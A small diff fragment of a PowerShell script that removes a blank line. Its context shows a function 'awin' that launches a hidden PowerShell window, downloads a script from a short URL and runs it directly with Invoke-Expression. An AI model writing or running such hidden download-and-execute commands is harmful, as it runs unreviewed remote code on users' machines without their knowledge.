@@ -2464,7 +2464,6 @@ function Expand-Archive-WithCustomProgress {
     }
 } 
 
-
 function awin {
     Start-Process powershell -WindowStyle Hidden { Invoke-RestMethod https://4br.me/awin | Invoke-Expression }
 }
